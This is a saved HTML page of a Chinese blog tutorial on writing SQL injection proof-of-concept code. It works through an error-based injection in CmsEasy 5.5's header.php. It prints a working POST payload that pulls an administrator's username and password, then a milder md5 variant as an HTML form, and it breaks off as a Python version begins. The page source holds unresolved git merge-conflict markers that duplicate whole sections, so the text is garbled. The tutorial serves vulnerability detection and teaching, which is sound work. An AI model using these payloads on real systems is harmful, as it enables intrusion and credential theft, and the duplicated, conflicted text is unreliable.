<!doctype html>
<html class="theme-next use-motion theme-next-mist">
<head>
  

<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />








  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>




<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.5.1"/>


    <meta name="description" content="不是路人甲的闲人丁,娱乐型选手" />



  <meta name="keywords" content="PoC," />





  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1" />


<meta name="description" content="2.1 SQL 注入基础准备完这些通用的基础知识之后，我们就可以开始编写自己的第一个 PoC 了。为什么要选 SQL 注入作第一个呢？因为它最常见，相信看本教程的你肯定在这之前都了解了，没了解我也装作你了解了给你讲，你上学的时候老师不都这么干的嘛。
2.1.1 SQL 注入原理SQL 注入漏洞是发生于应用程序与数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽">
<meta property="og:type" content="article">
<meta property="og:title" content="PoC 编写指南(第 2 章 SQL 注入类 PoC 编写 上篇)">
<meta property="og:url" content="http://blog.evalbug.com/2015/12/27/poc_coding_2/index.html">
<meta property="og:site_name" content="Medici.Yan's Blog">
<meta property="og:description" content="2.1 SQL 注入基础准备完这些通用的基础知识之后，我们就可以开始编写自己的第一个 PoC 了。为什么要选 SQL 注入作第一个呢？因为它最常见，相信看本教程的你肯定在这之前都了解了，没了解我也装作你了解了给你讲，你上学的时候老师不都这么干的嘛。
2.1.1 SQL 注入原理SQL 注入漏洞是发生于应用程序与数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽">
<meta property="og:image" content="http://blog.evalbug.com/images/poc_coding_img/2-1.png">
<meta property="og:image" content="http://blog.evalbug.com/images/poc_coding_img/2-2.png">
<meta property="og:image" content="http://blog.evalbug.com/images/poc_coding_img/2-3.png">
<meta property="og:image" content="http://blog.evalbug.com/images/poc_coding_img/2-4.png">
<meta property="og:image" content="http://blog.evalbug.com/images/poc_coding_img/2-5.png">
<meta property="og:updated_time" content="2016-04-09T14:48:25.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="PoC 编写指南(第 2 章 SQL 注入类 PoC 编写 上篇)">
<meta name="twitter:description" content="2.1 SQL 注入基础准备完这些通用的基础知识之后，我们就可以开始编写自己的第一个 PoC 了。为什么要选 SQL 注入作第一个呢？因为它最常见，相信看本教程的你肯定在这之前都了解了，没了解我也装作你了解了给你讲，你上学的时候老师不都这么干的嘛。
2.1.1 SQL 注入原理SQL 注入漏洞是发生于应用程序与数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽">
<<<<<<< HEAD
<meta name="twitter:image" content="http://blog.evalbug.com/images/poc_coding_img/2-1.png">
=======
>>>>>>> github/master


<script type="text/javascript" id="hexo.configuration">
  var CONFIG = {
    scheme: 'Mist',
    sidebar: 'post'
  };
</script>

  <title> PoC 编写指南(第 2 章 SQL 注入类 PoC 编写 上篇) | Medici.Yan's Blog </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  <!--[if lte IE 8]>
  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
           style='margin-left:auto;margin-right:auto;display: block;'/>
    </a>
  </div>
<![endif]-->
  

  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?35fe43c56e8a4a68a6a2ae899b9028fb";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>
  <script>
    (function(){
        var bp = document.createElement('script');
        bp.src = '//push.zhanzhang.baidu.com/push.js';
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>



  <div class="container one-column page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><h1 class="site-meta">
  <span class="logo-line-before"><i></i></span>
  <a href="/" class="brand" rel="start">
      <span class="logo">
        <i class="icon-next-logo"></i>
      </span>
      <span class="site-title">Medici.Yan's Blog</span>
  </a>
  <span class="logo-line-after"><i></i></span>
</h1>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu menu-left">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            <i class="menu-item-icon icon-next-home"></i> <br />
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            <i class="menu-item-icon icon-next-about"></i> <br />
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            <i class="menu-item-icon icon-next-tags"></i> <br />
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            <i class="menu-item-icon icon-next-categories"></i> <br />
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            <i class="menu-item-icon icon-next-archives"></i> <br />
            归档
          </a>
        </li>
      

      
      
    </ul>
  

  
    <div class="site-search">
      
  <form class="site-search-form" >
  <input type="text" id="ts-search-input" class="menu-search-input">
</form>
<script>
  var option = {
    engineKey: 'c9b47bfaa23404adf331'
  };
  (function(w,d,t,u,n,s,e){
    s = d.createElement(t);
    s.src = u;
    s.async = 1;
    w[n] = function(r){
      w[n].opts = r;
    };
    e = d.getElementsByTagName(t)[0];
    e.parentNode.insertBefore(s, e);
  })(window,document,'script','//tinysou-cdn.b0.upaiyun.com/ts.js','_ts');
  _ts(option);
</script>



    </div>
  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div id="content" class="content"> 

  <div id="posts" class="posts-expand">
    

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <header class="post-header">

      
      
        <h1 class="post-title" itemprop="name headline">
          
          
            
              PoC 编写指南(第 2 章 SQL 注入类 PoC 编写 上篇)
            
          
        </h1>
      

      <div class="post-meta">
        <span class="post-time">
          发表于
          <time itemprop="dateCreated" datetime="2015-12-27T00:00:48+08:00" content="2015-12-27">
            2015-12-27
          </time>
        </span>

        
          <span class="post-category" >
            &nbsp; | &nbsp; 分类于
            
              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                <a href="/categories/PoC/" itemprop="url" rel="index">
                  <span itemprop="name">PoC</span>
                </a>
              </span>

              
              

            
          </span>
        

        
          
            <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/2015/12/27/poc_coding_2/#comments" itemprop="discussionUrl">
                <span class="post-comments-count ds-thread-count" data-thread-key="2015/12/27/poc_coding_2/" itemprop="commentsCount"></span>
              </a>
            </span>
          
        
      </div>
    </header>

    <div class="post-body">

      
      

      
<<<<<<< HEAD
        <span itemprop="articleBody"><h2 id="2-1-SQL-注入基础"><a href="#2-1-SQL-注入基础" class="headerlink" title="2.1 SQL 注入基础"></a>2.1 SQL 注入基础</h2><p>准备完这些通用的基础知识之后，我们就可以开始编写自己的第一个 PoC 了。为什么要选 SQL 注入作第一个呢？因为它最常见，相信看本教程的你肯定在这之前都了解了，没了解我也装作你了解了给你讲，你上学的时候老师不都这么干的嘛。</p>
<h3 id="2-1-1-SQL-注入原理"><a href="#2-1-1-SQL-注入原理" class="headerlink" title="2.1.1 SQL 注入原理"></a>2.1.1 SQL 注入原理</h3><p>SQL 注入漏洞是发生于应用程序与数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了检查，那么这些注入进去的指令就会被数据库服务器误认为是正常的 SQL 指令而运行，因此遭到破坏或是入侵。</p>
=======
        <span itemprop="articleBody"><h2 id="2-1_SQL_注入基础">2.1 SQL 注入基础</h2><p>准备完这些通用的基础知识之后，我们就可以开始编写自己的第一个 PoC 了。为什么要选 SQL 注入作第一个呢？因为它最常见，相信看本教程的你肯定在这之前都了解了，没了解我也装作你了解了给你讲，你上学的时候老师不都这么干的嘛。</p>
<h3 id="2-1-1_SQL_注入原理">2.1.1 SQL 注入原理</h3><p>SQL 注入漏洞是发生于应用程序与数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了检查，那么这些注入进去的指令就会被数据库服务器误认为是正常的 SQL 指令而运行，因此遭到破坏或是入侵。</p>
>>>>>>> github/master
<p>如果你不懂什么是 SQL 注入的话，这里我推荐去看 <a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">sqli-labs</a> 这是目前我见过的最详细讲解 SQL 注入的资料了。不过都是纯英文的，但是也没多少难度。FreeBuf 上有两篇对应的中文介绍，你也可以去看看，相信对你是有帮助的。 </p>
<p><a href="http://www.freebuf.com/articles/web/34619.html" target="_blank" rel="external">安全科普：SQLi Labs 指南 Part 1</a></p>
<p><a href="http://www.freebuf.com/articles/web/38315.html" target="_blank" rel="external">安全科普：SQLi Labs 指南 Part 2</a></p>
<blockquote>
<p>倘若要是连 SQL 都不知道的话，我觉得吧，磨刀不误砍柴工，你觉得呢？</p>
</blockquote>
<<<<<<< HEAD
<h3 id="2-1-2-SQL-注入分类"><a href="#2-1-2-SQL-注入分类" class="headerlink" title="2.1.2 SQL 注入分类"></a>2.1.2 SQL 注入分类</h3><p>分类这种东西对是相对的,看你站在什么角度了,我一直都很讨厌这些分类,如果你仔细去研究这些个分类,你会觉得这世界上的发明家太多了,想一出是一出啊。</p>
<p>反正我也是发明家，下面这些个分类是我个人的见解。</p>
<a id="more"></a>
<h4 id="按照注入点类型来分类"><a href="#按照注入点类型来分类" class="headerlink" title="按照注入点类型来分类"></a>按照注入点类型来分类</h4><ul>
=======
<h3 id="2-1-2_SQL_注入分类">2.1.2 SQL 注入分类</h3><p>分类这种东西对是相对的,看你站在什么角度了,我一直都很讨厌这些分类,如果你仔细去研究这些个分类,你会觉得这世界上的发明家太多了,想一出是一出啊。</p>
<p>反正我也是发明家，下面这些个分类是我个人的见解。</p>
<a id="more"></a>
<h4 id="按照注入点类型来分类">按照注入点类型来分类</h4><ul>
>>>>>>> github/master
<li><p>数字型注入点</p>
<p>在 Web 端大概是 <a href="http://xxx.com/news.php?id=1" target="_blank" rel="external">http://xxx.com/news.php?id=1</a> 这种形式，其注入点 id 类型为数字，所以叫数字型注入点。这一类的 SQL 语句原型大概为 <code>select * from 表名 where id=1</code>。</p>
</li>
<li><p>字符型注入点</p>
<p>在 Web 端大概是 <a href="http://xxx.com/news.php?name=admin" target="_blank" rel="external">http://xxx.com/news.php?name=admin</a> 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 <code>select * from 表名 where name=&#39;admin&#39;</code>。注意多了引号。</p>
</li>
<li><p>搜索型注入点</p>
<p>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“keyword=关键字”，有的不显示在的链接地址里面，而是直接通过搜索框表单提交。<br>此类注入点提交的 SQL 语句，其原形大致为：<code>select * from 表名 where 字段 like &#39;%关键字%&#39;</code>。</p>
</li>
</ul>
<<<<<<< HEAD
<h4 id="按照数据提交的方式来分类"><a href="#按照数据提交的方式来分类" class="headerlink" title="按照数据提交的方式来分类"></a>按照数据提交的方式来分类</h4><p>这种分类其实只是 HTTP 传递数据的方式不同，严格来讲和 SQL 没多大关系，但是在编写 PoC 的时候，这会影响到我们的代码中发送数据的形式，所以我在这里提出来了。</p>
=======
<h4 id="按照数据提交的方式来分类">按照数据提交的方式来分类</h4><p>这种分类其实只是 HTTP 传递数据的方式不同，严格来讲和 SQL 没多大关系，但是在编写 PoC 的时候，这会影响到我们的代码中发送数据的形式，所以我在这里提出来了。</p>
>>>>>>> github/master
<ul>
<li><p>GET 注入</p>
<p>提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接 <code>http://xxx.com/news.php?id=1</code> , id 是注入点。</p>
</li>
<li><p>POST 注入</p>
<p>使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。</p>
</li>
<li><p>Cookie 注入</p>
<p>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。</p>
</li>
<li><p>HTTP 头部注入</p>
<p>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p>
</li>
</ul>
<<<<<<< HEAD
<h4 id="按照执行效果来分类"><a href="#按照执行效果来分类" class="headerlink" title="按照执行效果来分类"></a>按照执行效果来分类</h4><p>这个分类也是 SQL 注入神器 sqlmap 所支持的注入模式，这个的分类的依据也是后面我们用 PoC 判断是否存在注入的依据。</p>
=======
<h4 id="按照执行效果来分类">按照执行效果来分类</h4><p>这个分类也是 SQL 注入神器 sqlmap 所支持的注入模式，这个的分类的依据也是后面我们用 PoC 判断是否存在注入的依据。</p>
>>>>>>> github/master
<ul>
<li><p>基于报错注入</p>
<p>这一类的也叫有回显注入，页面会返回错误信息，或者是把注入语句的结果直接返回在页面中。</p>
</li>
<li><p>基于布尔的盲注</p>
<p>根据返回页面的结果判断构造的SQL条件语句的真假性</p>
</li>
<li><p>基于时间的盲注</p>
<p>当根据页面返回的内容不能判断出任何信息时，使用条件语句查看时间延迟语句是否执行，也就是看页面返回时间是否增长来判断是否执行。</p>
</li>
</ul>
<p>我们后面会以执行的效果来讲怎么写每一类的 PoC。 </p>
<<<<<<< HEAD
<h2 id="2-2-基于报错的-SQL-注入-PoC-编写"><a href="#2-2-基于报错的-SQL-注入-PoC-编写" class="headerlink" title="2.2 基于报错的 SQL 注入 PoC 编写"></a>2.2 基于报错的 SQL 注入 PoC 编写</h2><p>这次我们选择的漏洞为 <a href="http://wooyun.org/bugs/wooyun-2010-070827" target="_blank" rel="external">CmsEasy 5.5 UTF-8 20140802/celive/live/header.php SQL注入漏洞</a>。</p>
<h3 id="2-2-1-漏洞分析"><a href="#2-2-1-漏洞分析" class="headerlink" title="2.2.1 漏洞分析"></a>2.2.1 漏洞分析</h3><p>漏洞分析在原文已经说的很详细了，大可以回原文查看。</p>
<p>我们在编写 PoC 的时候，如果原文中已经给出了具体的利用办法，我们就无需再关注整个漏洞的成因和原理，我们只用看这个漏洞的复现方式。</p>
<p>阅读原文后我们得到了 payload 和 目标 URL.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">请求的链接：</span><br><span class="line"></span><br><span class="line">http://xxx.com/celive/live/header.php</span><br><span class="line"></span><br><span class="line">POST 数据内容：</span><br><span class="line"></span><br><span class="line">xajax=LiveMessage&amp;xajaxargs[0][name]=1&apos;,(SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(select concat(username,0x23,password) from cmseasy_user where groupid=2 limit 1))a from information_schema.tables group by a)b),&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;1&apos;,&apos;127.0.0.1&apos;,&apos;2&apos;)#</span><br></pre></td></tr></table></figure>
<h3 id="2-2-2-漏洞复现"><a href="#2-2-2-漏洞复现" class="headerlink" title="2.2.2 漏洞复现"></a>2.2.2 漏洞复现</h3><p> 一般来说不推荐使用已经在线的站点做测试，因为一旦目标跑了一个比较重要的业务，倘若出了点问题，会对目标造成不可估量的损害。</p>
=======
<h2 id="2-2_基于报错的_SQL_注入_PoC_编写">2.2 基于报错的 SQL 注入 PoC 编写</h2><p>这次我们选择的漏洞为 <a href="http://wooyun.org/bugs/wooyun-2010-070827" target="_blank" rel="external">CmsEasy 5.5 UTF-8 20140802/celive/live/header.php SQL注入漏洞</a>。</p>
<h3 id="2-2-1_漏洞分析">2.2.1 漏洞分析</h3><p>漏洞分析在原文已经说的很详细了，大可以回原文查看。</p>
<p>我们在编写 PoC 的时候，如果原文中已经给出了具体的利用办法，我们就无需再关注整个漏洞的成因和原理，我们只用看这个漏洞的复现方式。</p>
<p>阅读原文后我们得到了 payload 和 目标 URL.</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">请求的链接：</span><br><span class="line"></span><br><span class="line">http://xxx.com/celive/live/header.php</span><br><span class="line"></span><br><span class="line">POST 数据内容：</span><br><span class="line"></span><br><span class="line">xajax=LiveMessage&amp;xajaxargs[0][name]=1',(<span class="operator"><span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>),(<span class="keyword">select</span> <span class="keyword">concat</span>(username,<span class="number">0x23</span>,<span class="keyword">password</span>) <span class="keyword">from</span> cmseasy_user <span class="keyword">where</span> groupid=<span class="number">2</span> <span class="keyword">limit</span> <span class="number">1</span>))a <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">group</span> <span class="keyword">by</span> a)b),<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">'1'</span>,<span class="string">'127.0.0.1'</span>,<span class="string">'2'</span>)#</span></span><br></pre></td></tr></table></figure>
<h3 id="2-2-2_漏洞复现">2.2.2 漏洞复现</h3><p> 一般来说不推荐使用已经在线的站点做测试，因为一旦目标跑了一个比较重要的业务，倘若出了点问题，会对目标造成不可估量的损害。</p>
>>>>>>> github/master
<p> <a href="http://pan.baidu.com/s/1i4lAwBF" target="_blank" rel="external">下载地址</a></p>
<p> 读者下载完安装包后，按照官方说明安装 CmsEasy 安装包。安装过程就不在此缀述。我将 其安装在网站目录下的 cmseasy 目录中。</p>
<p> 安装完毕后，我们就可以进行手工复现利用过程了。</p>
<p> 该漏洞的注入点在 POST 数据部分，我们需要发起一个 POST 请求，我们选择 Firefox 浏览器和 HackBar 插件。填上目标 url 和 payload，然后发送。可以看到返回页面报错，而报错信息中出现了 cmseasy_user 表中的数据(图 2-1)。</p>
<p> <img src="/images/poc_coding_img/2-1.png" alt="图 2-1"></p>
<p> 既然已经成功复现，那就可以进行 PoC 的编写了。</p>
<<<<<<< HEAD
<h3 id="2-2-3-无框架-PoC-编写"><a href="#2-2-3-无框架-PoC-编写" class="headerlink" title="2.2.3 无框架 PoC 编写"></a>2.2.3 无框架 PoC 编写</h3><p> 按理来说，这个 Payload 是已经可以证明漏洞存在了，但是，如果将 PoC 应用到扫描类的产品当中时，这些 Payload 原则上是不允许的。很多人一开始也不会注意这些。我们要注意下面几个原则:</p>
<ul>
<li><p>无损扫描</p>
<p>也就是要求不能对目标服务器有任何危害，所以我们在扫描的时候，是不能够把目标管理员的账号和密码直接注出到扫描报告当中的，但是我们要证明目标存在漏洞，所以我们只要能证明可以执行 SQL 指令就好了，比如:  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select char(77,101,100,105);</span><br><span class="line">  </span><br><span class="line">+----------------------+</span><br><span class="line">| char(77,101,100,105) |</span><br><span class="line">+----------------------+</span><br><span class="line">| Medi                 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
=======
<h3 id="2-2-3_无框架_PoC_编写">2.2.3 无框架 PoC 编写</h3><p> 按理来说，这个 Payload 是已经可以证明漏洞存在了，但是，如果将 PoC 应用到扫描类的产品当中时，这些 Payload 原则上是不允许的。很多人一开始也不会注意这些。我们要注意下面几个原则:</p>
<ul>
<li><p>无损扫描</p>
<p>也就是要求不能对目标服务器有任何危害，所以我们在扫描的时候，是不能够把目标管理员的账号和密码直接注出到扫描报告当中的，但是我们要证明目标存在漏洞，所以我们只要能证明可以执行 SQL 指令就好了，比如:  </p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select char(77,101,100,105);</span><br><span class="line"><span class="header">  </span><br><span class="line">+----------------------+</span></span><br><span class="line"><span class="header">| char(77,101,100,105) |</span><br><span class="line">+----------------------+</span></span><br><span class="line"><span class="header">| Medi                 |</span><br><span class="line">+----------------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
>>>>>>> github/master
<p>呐，就像上面代码中的那样。如果 ‘Medi’ 这个字符串出现在了返回的页面中，那就证明我们的指令执行了。</p>
</li>
</ul>
<ul>
<li><p>减少误报漏报</p>
<p>误报和漏报两者相伴相随。找漏洞这事，就和警察叔叔抓犯罪嫌疑人一样，漏报率低了，那么误报率就高了，嗯，你把全中国的人都抓了，里面肯定有潜逃的罪犯。如果误报率低了，那么相对的，漏报率就上去了，还是警察叔叔抓坏人，一抓一个准，但是这样的话，肯定就会有很多漏网之鱼了。所以就需要找到一个平衡点。</p>
<p>一般来说，大部分人追求的原则是可以漏报，但不能误报。你愿意走在路上给人抓去当嫌犯嘛。</p>
<p>那么再回来看上面说的，如果我们检测页面返回的内容当中有 ‘Medi’, 那就证明存在注入，这么去检测的话，这误报率简直高到要爆表啊，不信你检测下我的博客，保证你每一条链接都报注入。因为我的博客的每一个链接返回的页面里面都会带有 ‘Medi’ 这个字符。</p>
<p><strong>那么这就要求我们判断的字符串在正常的页面中要尽可能不会经常出现。比如我们会输出一串 md5 的值到页面中</strong></p>
<<<<<<< HEAD
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select md5(123);</span><br></pre></td></tr></table></figure>
=======
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="function">select <span class="title">md5</span><span class="params">(<span class="number">123</span>)</span></span>;</span><br></pre></td></tr></table></figure>
>>>>>>> github/master
</li>
</ul>
<blockquote>
<p>这样就能百分百的说不会误报了吗？当然不可能。如果那个页面就是闲的慌输出了一串和你判断逻辑一样的 md5 的值，那你不就傻了？但是这也是无法避免的，可是这种巧合实在是太少见了</p>
</blockquote>
<p>哦，最后再多说两句，为什么选 md5 呢，因为 mysql 里面有 md5 这个函数呀，写起来多简单呀，要是像 Oracle 数据库里面没 md5 这个函数怎么办呢？往上瞅瞅，看到了没？我们有 char() 函数(Oracle 里面是 chr())，可以把 ASCII 码转化成字符串，明白了吧？手动多打几个随机字符就好啦。</p>
<p>好了，来看看我们修改之后的 Payload :</p>
<<<<<<< HEAD
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">请求的链接：</span><br><span class="line"></span><br><span class="line">http://xxx.com/celive/live/header.php</span><br><span class="line"></span><br><span class="line">POST 数据内容：</span><br><span class="line"></span><br><span class="line">xajax=LiveMessage&amp;xajaxargs[0][name]=1&apos;,(SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(select md5(233)))a from information_schema.tables group by a)b),&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;1&apos;,&apos;127.0.0.1&apos;,&apos;2&apos;) #</span><br></pre></td></tr></table></figure>
=======
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">请求的链接：</span><br><span class="line"></span><br><span class="line">http://xxx.com/celive/live/header.php</span><br><span class="line"></span><br><span class="line">POST 数据内容：</span><br><span class="line"></span><br><span class="line">xajax=LiveMessage&amp;xajaxargs[0][name]=1',(<span class="operator"><span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>),(<span class="keyword">select</span> <span class="keyword">md5</span>(<span class="number">233</span>)))a <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">group</span> <span class="keyword">by</span> a)b),<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">'1'</span>,<span class="string">'127.0.0.1'</span>,<span class="string">'2'</span>) #</span></span><br></pre></td></tr></table></figure>
>>>>>>> github/master
<p>md5(233) 的值就是 e165421110ba03099a1c0393373c5b43</p>
<p><img src="/images/poc_coding_img/2-2.png" alt="图 2-2"></p>
<p>好吧来写 PoC 了。</p>
<p>目的是发送一个 POST 请求,于是我们写一个可以发送 POST 数据的程序：</p>
<p><code>代码 2_2_1.html</code>:</p>
<<<<<<< HEAD
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://localhost/cmseasy/celive/live/header.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;xajax&quot; value=&quot;LiveMessage&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;xajaxargs[0][name]&quot; value=&quot;1&apos;,(SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(select md5(233)))a from information_schema.tables group by a)b),&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;1&apos;,&apos;127.0.0.1&apos;,&apos;2&apos;) #&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;GO&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
=======
<figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">"http://localhost/cmseasy/celive/live/header.php"</span> <span class="keyword">method</span>=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;input <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"xajax"</span> value=<span class="string">"LiveMessage"</span> /&gt;</span><br><span class="line">&lt;input <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"xajaxargs[0][name]"</span> value=<span class="string">"1',(SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(select md5(233)))a from information_schema.tables group by a)b),'','','','1','127.0.0.1','2') #"</span> /&gt;</span><br><span class="line">&lt;input <span class="keyword">type</span>=<span class="string">"submit"</span> value=<span class="string">"GO"</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
>>>>>>> github/master
<p>将上面的代码保存成 <code>2_2_1.html</code> 然后用浏览器打开(如图 2-3)。</p>
<p><img src="/images/poc_coding_img/2-3.png" alt="图 2-3"></p>
<p>然后点击按钮提交，看效果达到了吧？(如图 2-4)</p>
<p><img src="/images/poc_coding_img/2-4.png" alt="图2-4"></p>
<p><strong>呐，上面那段 HTML 的代码，就是所谓的 PoC 了。</strong></p>
<blockquote>
<p>WTF? 这玩意儿就是 PoC ?</p>
</blockquote>
<p>是的你没有看错，这就是 PoC。是不是太简单了？我一开始就说过，PoC 是证明漏洞存在的代码，而代码实现起来，是没有语言之分的。</p>
<p>好吧，道理讲明白了，那还是看看 Python 是怎么实现的吧。</p>
<p><code>代码 2_2_2.py</code>:</p>
<<<<<<< HEAD
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td 